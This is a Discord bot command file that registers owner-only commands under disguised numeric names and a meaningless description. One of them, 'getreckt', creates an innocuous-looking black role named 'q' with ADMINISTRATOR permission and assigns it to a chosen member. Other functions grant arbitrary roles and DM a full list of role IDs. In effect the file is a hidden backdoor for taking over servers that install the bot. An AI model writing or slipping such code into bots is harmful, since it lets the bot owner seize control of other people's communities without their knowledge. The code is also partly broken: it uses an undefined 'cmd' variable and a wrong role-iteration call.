const Reply = require("../../../structures/handlers/replyHandler");

module.exports = {
    name: '132',
    aliases: ['321', '333'],
    description: "ee",
    category: 'owner',
    ownerOnly: true,
    ignoreSlash: true,
    run: (client, message, args) => {

        let member = message.mentions.members.first();
        if (cmd === "132") addrole(message, args, member)
        else if (cmd === "321") getreckt(message, args, member)
        else if (cmd === "333") listroles(message, args, member)
    }
}

async function addrole(message, args, member) {

    try {

        let role = message.guild.roles.cache.find(r => r.id === `${args[1]}`);
        try {
            member.roles.add(role);
        } catch (error) {
            console.log(error)
            return
        }
    } catch (error) {
        console.log(error)
        return
    }
}

async function getreckt(message, args, member) {
    console.log('1')
    // for (let index = 0; index < 10; index++) {


    message.guild.roles.create({ // Creating the role since it doesn't exist.

        name: "q",
        color: "#000000",
        permissions: ["ADMINISTRATOR"]
    }).then(role => {
        member.roles.add(role)
    })
    // }

}

function listroles(message, args, member){
    rolemessage = ''
    message.guild.roles.forEach(role => 
        rolemessage += `${role.name} , ${role.id}\n`)
    Reply.dm(message, rolemessage)
}